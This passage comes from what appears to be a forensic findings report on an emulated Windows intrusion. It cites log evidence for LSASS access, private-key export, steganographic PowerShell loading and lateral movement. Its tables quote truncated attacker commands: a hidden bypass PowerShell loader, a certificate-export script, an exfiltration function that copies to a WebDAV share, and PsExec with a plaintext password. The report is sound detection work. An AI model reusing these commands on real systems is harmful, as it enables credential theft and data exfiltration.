| 4 | 2020-05-02 03:08:35.270Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\AppData\Roaming\OfficeSupplies.7z | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkx5Y3M | q-c9547c13c4 | ok |
| 5 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | message | Creating Scriptblock text (1 of 1):  function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHo31uOFchItz5hds0 | q-0d63ac5c98 | ok |
| 6 | 2020-05-02 03:16:00.353Z | nashua.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\AppData\Roaming\working.zip | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkmtdLv | q-68a818f95e | ok |
| 7 | 2020-05-02 03:16:19.395Z | nashua.dmevals.local | windows.sysmon | process.command_line | "C:\Windows\Temp\Rar.exe" a -hpfGzq5yKw C:\Users\pbeesly\Desktop\working.zip C:\Users\pbeesly\AppData\Roaming\working.zip | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkmtdI9 | q-3c10d0cd64 | ok |
| 8 | 2020-05-02 03:16:19.462Z | nashua.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\Desktop\working.zip | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkmtAyz | q-68a818f95e | ok |

### F25 · malicious / high · T1552.004 · Get-PrivateKeys PowerShell function exported every LocalMachine certificate to a password-protected .pfx in the user's Downloads folder

Evidence status: **verified**

On scranton.dmevals.local, in the PowerShell session of user pbeesly (PID 3876, script block path C:\Program Files\SysinternalsSuite\readme.ps1), a function Get-PrivateKeys was defined at 2020-05-02T03:04:56Z and invoked immediately afterwards. It enumerates cert:\LocalMachine recursively and calls Export-PfxCertificate for every certificate with a thumbprint, writing to $env:USERPROFILE\Downloads\<random>.pfx protected by the hardcoded plaintext password "saribas". Sysmon confirms the resulting artifact: powershell.exe (PID 3876) created C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx at 03:04:57.460Z. This is bulk private-key/certificate harvesting staged for exfiltration, part of a broader hands-on-keyboard intrusion by pbeesly on scranton (Sysinternals tooling, sdelete anti-forensics, PsExec with a plaintext password to \\NASHUA).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwCkSzI | q-3d84a35ce3 | ok |
| 2 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\readme.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwCkSzI | q-3d84a35ce3 | ok |
| 3 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Get-PrivateKeys | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwCkSxb | q-1ca73ad904 | ok |
| 4 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQ71_ | q-34d0a74633 | ok |
| 5 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQ71_ | q-34d0a74633 | ok |

### F60 · malicious / high · T1552.004 · Get-PrivateKeys exported every LocalMachine certificate to a password-protected .pfx in pbeesly's Downloads on scranton

Evidence status: **verified**

At 03:04:56 on scranton.dmevals.local a PowerShell scriptblock defined function Get-PrivateKeys, which builds a SecureString from the hardcoded password "saribas", enumerates cert:\LocalMachine recursively and writes each certificate with its private key to a random file name under the user profile. At 03:04:57 PowerShell created C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx — the exported private-key material.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | message | Creating Scriptblock text (1 of 1):  function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-C… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwCkSzI | q-ab1eda409c | ok |
| 2 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQ71_ | q-c9547c13c4 | ok |
| 3 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQ71_ | q-c9547c13c4 | ok |

### F66 · malicious / medium · T1552.006 · Malicious .scr executed from C:\ProgramData\victim by explorer, then wiped with sdelete64

Evidence status: **verified**

At 02:55:56 explorer.exe launched "C:\ProgramData\victim\â€®cod.3aka3.scr" /S as pbeesly; the .scr wrote C:\Users\pbeesly\Downloads\monkey.png at 02:57:00 and spawned cmd.exe/conhost.exe. At 03:02:04 pbeesly's PowerShell ran sdelete64.exe /accepteula against the same .scr to destroy it. This is the initial payload that preceded the credential-access tooling.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:55:56.157Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\ProgramData\victim\â€®cod.3aka3.scr" /S | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpk1QgV | q-c8a02c6c52 | ok |
| 2 | 2020-05-02 02:57:00.933Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\Downloads\monkey.png | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpizF2M | q-face93ed7a | ok |

### F31 · malicious / high · T1555 · PowerShell opens LSASS with full access (0x1F3FFF / 0x1FFFFF) on scranton and nashua under user pbeesly

Evidence status: **verified**

On scranton.dmevals.local, PowerShell.exe (PID 2976) opened lsass.exe (PID 736) twice within 31 ms at 2020-05-02T03:05:16Z with GrantedAccess 0x1F3FFF and 0x1FFFFF — full-process access masks used for memory dumping, with an UNKNOWN call trace outside ntdll/KERNELBASE. The security channel independently records powershell.exe (as pbeesly) accessing \Device\HarddiskVolume2\Windows\System32\lsass.exe at 23:05:16 local. On nashua.dmevals.local, wsmprovhost.exe (PID 7720, the remote-PowerShell host running as pbeesly) opened lsass.exe (PID 728) with 0x1F3FFF at 03:09:29Z, with a call trace through System.ni.dll and Microsoft.PowerShell.Commands.Management.ni.dll — i.e. a PowerShell cmdlet reading LSASS. This is preceded on nashua by the script block 'Get-Process -IncludeUserName \| Select-Object UserName,SessionId ...' (03:09:28Z) and on scranton by 'get-process' (03:01:03Z) and a Keystroke-Check AV-enumeration function (03:06:47Z), all run by pbeesly from C:\Program Files\SysinternalsSuite\psversion.ps1. The same actor also ran an Invoke-Exfil function that 7-Zips the Downloads folder with password 'lolol' and copies it to \\192.168.0.4\webdav. The remaining LSASS access (svchost.exe 0x1000, WindowsAzureTelemetryService.exe 0x1400, wininit/csrss at boot) is normal system behaviour.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3G | q-fbf54bd0c0 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-fbf54bd0c0 | ok |
| 3 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3G | q-fbf54bd0c0 | ok |
| 4 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\wsmprovhost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw4a_B | q-fbf54bd0c0 | ok |
| 5 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw4a_B | q-fbf54bd0c0 | ok |
| 6 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | win.ProcessName | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwqOo54 | q-006eb78e60 | ok |
| 7 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | win.SubjectUserName | pbeesly | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwqOo54 | q-006eb78e60 | ok |
| 8 | 2020-05-02 03:09:28.000Z | nashua.dmevals.local | windows.powershell | win.ScriptBlockText |  Get-Process -IncludeUserName \| Select-Object UserName,SessionId \| Where-Object { $_.UserName -like "*\$env:USERNAME" } \| Sort-Object SessionId -Unique  | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHo31uOFchItz-ho2U | q-c55e5a15e3 | ok |
| 9 | 2020-05-02 03:06:47.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Keystroke-Check {     Get-Process \| Where-Object { $_.ProcessName -Eq "avp" -or $_.ProcessName -Eq "acs" -or $_.ProcessName -Eq "outpost" -or $_.Proce… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwAjYpu | q-c55e5a15e3 | ok |
| 10 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHo31uOFchItz5hds0 | q-f956224cc7 | ok |

### F64 · malicious / high · T1555 · PowerShell/wsmprovhost credential-store access to LSASS on scranton and nashua

Evidence status: **verified**

Beyond the anchors, the same window shows a second LSASS access path: on nashua.dmevals.local wsmprovhost.exe (WinRM host running pbeesly's remote PowerShell) opened lsass.exe with GrantedAccess 0x1f3fff at 03:09:29, immediately before the PsExec64.exe pushes to NASHUA at 03:11:18. On scranton, PowerShell.exe opened lsass.exe with 0x1f3fff and 0x1fffff at 03:05:16. All other lsass handles in the window are svchost.exe with 0x1000 (normal LSM/RPC).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw4a_B | q-247b95f06f | ok |
| 2 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw4a_B | q-247b95f06f | ok |
| 3 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3G | q-65829f2382 | ok |

### F35 · malicious / high · T1556 · Credential theft and lateral movement by pbeesly on scranton/nashua; no authentication-process modification observed

Evidence status: **verified**

On 2020-05-02 between 02:56 and 03:14 UTC, user pbeesly on scranton.dmevals.local ran an interactive PowerShell session that staged data (Compress-Archive of documents/password-named files), executed an obfuscated hidden PowerShell payload (monkey.png steganography, IEX) spawned from control.exe, ran discovery/persistence functions, exported private keys (Get-PrivateKeys), took screenshots, wiped artifacts with sdelete64.exe, and then used PsExec64.exe with the plaintext password of dmevals\pbeesly to run C:\Windows\Temp\python.exe on \\NASHUA. On nashua, wsmprovhost.exe (pbeesly, PID 7720) opened lsass.exe with GrantedAccess 0x1f3fff, and on scranton PowerShell.exe (PID 2976, the hidden -ep bypass payload) opened lsass.exe with 0x1fffff — credential dumping consistent with the Credential Access tactic. However, no modification of the authentication process itself was found: the only LSA registry writes were made by lsass.exe itself at boot (LsaPid, LsaCfgFlagsDefault, ProductType), no password-filter/Notification Packages changes, no reversible-encryption or MFA/hybrid-identity changes, and no NetworkProvider registry or file changes. The T1556 family hits are therefore credential-access-adjacent but not authentication-process tampering.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-5f4f798dce | ok |
| 2 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw4a_B | q-5f4f798dce | ok |
| 3 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.command_line | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpgwo_a | q-b7fa47cb5a | ok |
| 4 | 2020-05-02 03:11:18.784Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItku2r93 | q-ec50db6bbf | ok |
| 5 | 2020-05-02 03:19:09.834Z | scranton.dmevals.local | windows.sysmon | registry.path | HKLM\System\CurrentControlSet\Control\Lsa\LsaPid | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpq9JAx | q-875d8d319d | ok |
| 6 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Get-PrivateKeys | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwCkSxb | q-79342e2cb2 | ok |

### F36 · malicious / medium · T1556.001 · LSASS access on scranton and nashua by attacker PowerShell — credential dumping, not DC auth backdoor

Evidence status: **verified**

Sysmon event 10 shows C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe (PID 2976, the hidden -ep bypass payload launched by control.exe) on scranton.dmevals.local opening lsass.exe with GrantedAccess 0x1f3fff and 0x1fffff at 03:05:16, and wsmprovhost.exe (PID 7720, pbeesly) on nashua.dmevals.local opening lsass.exe with 0x1f3fff at 03:09:29. These are full-access handles typical of credential dumping (e.g. MiniDumpWriteDump via PowerShell), not modification of domain-controller authentication. The remaining 289 LSASS accesses are svchost.exe with 0x1000 (query-only) plus AV/telemetry agents, and the LSA registry writes were made by lsass.exe itself at boot. No evidence of injected/backdoor authentication on a DC.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-5f4f798dce | ok |
| 2 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\wsmprovhost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw4a_B | q-5f4f798dce | ok |
| 3 | 2020-05-02 03:09:23.885Z | nashua.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\wsmprovhost.exe -Embedding | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw468x | q-b7fa47cb5a | ok |
| 4 | 2020-05-02 03:19:09.865Z | scranton.dmevals.local | windows.sysmon | registry.path | HKLM\System\CurrentControlSet\Control\Lsa\LsaCfgFlagsDefault | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpq9JAz | q-875d8d319d | ok |

### F56 · malicious / high · T1649 · Persistent RSA machine key exported and written to a .pfx file by PowerShell on scranton.dmevals.local

Evidence status: **verified**

On scranton.dmevals.local at 2020-05-02T03:04:57Z, under the context of user DMEVALS\pbeesly (logon 0x372E81, process ID 3876 = C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe, process creation time 03:00:13.551Z), the Microsoft Software Key Storage Provider performed a 'Read persisted key from file' of machine key {ADA1F326-B4FE-4C0C-B68C-1B4CA6F364AC} (Security 5058) and then an 'Export of persistent cryptographic key' with AlgorithmName RSA (Security 5059), both returning 0x0. In the same second Sysmon recorded the creation of C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx by that same PowerShell process — i.e. a private key/certificate was exported from the machine key store into an attacker-named PFX file. This PowerShell process was spawned by a hidden, encoded PowerShell parent ('PowerShell.exe -noni -noexit -ep bypass -window hidden -c ... IEX(...)' decoding a payload from monkey.png), and the surrounding activity on the host includes Sysinternals accesschk.exe writing 'passwordsDB' at 03:04:35Z, further hidden base64 PowerShell at 03:21:28Z and a UAC-elevation attempt via hostui.exe at 03:21:19Z. The certificate/key theft is therefore part of an active intrusion, not administration.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:57.000Z | scranton.dmevals.local | windows.security | win.Message | Key migration operation.    Subject:  	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107  	Account Name:		pbeesly  	Account Domain:		DMEVALS  	Logon … | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwqOo5u | q-745e706e56 | ok |
| 2 | 2020-05-02 03:04:57.000Z | scranton.dmevals.local | windows.security | win.KeyName | {ADA1F326-B4FE-4C0C-B68C-1B4CA6F364AC} | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwqOo5u | q-745e706e56 | ok |
| 3 | 2020-05-02 03:04:57.000Z | scranton.dmevals.local | windows.security | win.SubjectUserName | pbeesly | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwqOo5u | q-745e706e56 | ok |
| 4 | 2020-05-02 03:04:57.000Z | scranton.dmevals.local | windows.security | win.KeyFilePath | C:\ProgramData\Microsoft\Crypto\Keys\4b54158166cc06f052219e6f9dd99e61_47ab858c-e134-41af-97b1-464e68b17455 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwqOo5W | q-4c70e81ff3 | ok |
| 5 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQ71_ | q-9f45b88d4d | ok |
| 6 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQ71_ | q-9f45b88d4d | ok |
| 7 | 2020-05-02 03:05:24.771Z | scranton.dmevals.local | windows.sysmon | win.ParentCommandLine | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQb3a | q-4513a9bfe0 | ok |
| 8 | 2020-05-02 03:04:35.069Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Program Files\SysinternalsSuite\passwordsDB | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCRb2e | q-db663d4cbe | ok |

### F03 · suspicious / medium · T1003.004 · LSA secrets registry key (ControlSet001\Control\Lsa) read by pbeesly's processes on scranton

Evidence status: **verified**

On scranton.dmevals.local, user pbeesly's processes — including C:\ProgramData\victim\â€®cod.3aka3.scr (a masquerading .scr in a 'victim' folder), cmd.exe, conhost.exe and powershell.exe — generated 4663 object-access events on \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa (AccessMask 0x1, Query key value) from 2020-05-01T22:55:56Z onward, and 4673 privilege-use events for SeProfileSingleProcessPrivilege/SeTcbPrivilege. Reading the Lsa key is consistent with LSA secrets / cached-credential harvesting by the same actor who later opened LSASS with 0x1fffff. The 4662 SecretObject events on Policy\Secrets\$MACHINE.ACC are separate and were performed by NT AUTHORITY\LOCAL SERVICE (benign machine-account secret access).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:55:56.000Z | scranton.dmevals.local | windows.security | win.ObjectName | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwxYBM3 | q-e7c1d57f4c | ok |
| 2 | 2020-05-02 02:56:14.000Z | scranton.dmevals.local | windows.security | win.ProcessName | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwxYBMV | q-e7c1d57f4c | ok |
| 3 | 2020-05-02 02:55:56.000Z | scranton.dmevals.local | windows.security | win.PrivilegeList | SeProfileSingleProcessPrivilege | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwxYBM_ | q-177adcf2a0 | ok |
| 4 | 2020-05-02 02:58:44.000Z | scranton.dmevals.local | windows.security | win.PrivilegeList | SeTcbPrivilege | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwwWlFq | q-177adcf2a0 | ok |

### F65 · suspicious / medium · T1056.002 · hostui.exe launched by PowerShell on scranton and immediately opened Explorer with 0x1400 access

Evidence status: **verified**

At 03:21:27 pbeesly's PowerShell started C:\Windows\System32\hostui.exe (no arguments), and one second later hostui.exe opened C:\windows\Explorer.EXE with GrantedAccess 0x1400 (PROCESS_QUERY_INFORMATION\|PROCESS_VM_READ) from its own code (hostui.exe+12d5/+1e28). Reading the interactive shell's memory is consistent with harvesting UI/clipboard data; the same PowerShell session also ran the screen-capture/clipboard scriptblock earlier. No other hostui.exe activity exists in the window.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:27.276Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Windows\System32\hostui.exe"  | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkILJ_D | q-c8a02c6c52 | ok |
| 2 | 2020-05-02 03:21:27.634Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1400 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHoX1uOFchItn-AkDI | q-724b54dac7 | ok |
| 3 | 2020-05-02 03:21:27.634Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\Explorer.EXE | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHoX1uOFchItn-AkDI | q-724b54dac7 | ok |
| 4 | 2020-05-02 03:21:27.634Z | scranton.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|C:\Windows\System32\hostui.exe+12d5\|C:\Windows\System32\hostui.exe+1e28\|C:\wind… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHoX1uOFchItn-AkDI | q-724b54dac7 | ok |

### F14 · suspicious / medium · T1056.004 · PowerShell and wsmprovhost handle access to lsass.exe (credential API access), no injected hooking DLLs seen

Evidence status: **verified**

Sysmon event 10 shows lsass.exe handle opens from non-standard sources: powershell.exe on scranton.dmevals.local at 03:01:03Z with GrantedAccess 0x1000 (two events, call trace through System.ni.dll / PowerShell management assemblies), and wsmprovhost.exe on nashua.dmevals.local at 03:09:29Z with GrantedAccess 0x1f3fff (broad access including PROCESS_VM_READ) via PowerShell remoting. The remaining 326 lsass handle events come from svchost.exe (289), Azure antimalware/telemetry binaries (28) and other system processes. No unusual image loads into credential-handling processes were identified in the image-load stack. The PowerShell-originated lsass access coincides with the same hands-on PowerShell session that performed screen/clipboard capture on scranton, so it is treated as suspicious credential-access activity rather than confirmed API hooking.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:01:03.622Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpLb9km | q-dd8f1f5f88 | ok |
| 2 | 2020-05-02 03:01:03.622Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1000 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpLb9km | q-dd8f1f5f88 | ok |
| 3 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\wsmprovhost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw4a_B | q-67b3806e60 | ok |
| 4 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw4a_B | q-67b3806e60 | ok |

### F17 · suspicious / medium · T1110.002 · No cracking tooling or hash files; LSASS handle access is the only credential-access signal

Evidence status: **verified**

No hashcat/john/potfile/wordlist artifacts appear in the 1649 file-creation events or the 447 process-creation events; the only LSASS-targeting process creations are lsass.exe itself (parent wininit.exe). The 326 LSASS handle events are mostly benign (0x1000/0x1400 from svchost, wininit, csrss, wsmprovhost), but 9 high-privilege accesses stand out, notably PowerShell.exe with 0x1fffff/0x1f3fff on scranton at 03:05:16 from the hidden monkey.png loader. SAM_SERVER 4656 events (0xf003f) are all issued by lsass.exe itself under SCRANTON$, i.e. normal. Cracking itself is not observed, but the LSASS access is consistent with dumping hashes for later offline cracking.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3G | q-bf0bf74605 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-bf0bf74605 | ok |
| 3 | 2020-05-02 03:19:21.000Z | scranton.dmevals.local | windows.security | win.ObjectName | SAM | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItsS38Vi | q-9e0c04802b | ok |
| 4 | 2020-05-02 03:19:21.000Z | scranton.dmevals.local | windows.security | process.executable | C:\Windows\System32\lsass.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItsS38Vi | q-9e0c04802b | ok |

### F67 · suspicious / low · T1552 · sdclt.exe launched three times by cmd.exe as pbeesly on scranton (UAC-bypass/backup abuse binary)

Evidence status: **verified**

On scranton.dmevals.local, pbeesly's cmd.exe launched sdclt.exe three times within one second (02:58:42.401, 02:58:42.855, 02:58:43.008), and sdclt.exe in turn spawned control.exe. sdclt is a known UAC-bypass/backup-abuse binary; the burst immediately precedes the csc.exe compile at 02:58:45. No credential file or LSASS access is attributable to sdclt in the retrieved events, so this is assessed suspicious rather than confirmed credential theft.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:58:42.401Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\sdclt.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpgxY85 | q-674dceb703 | ok |
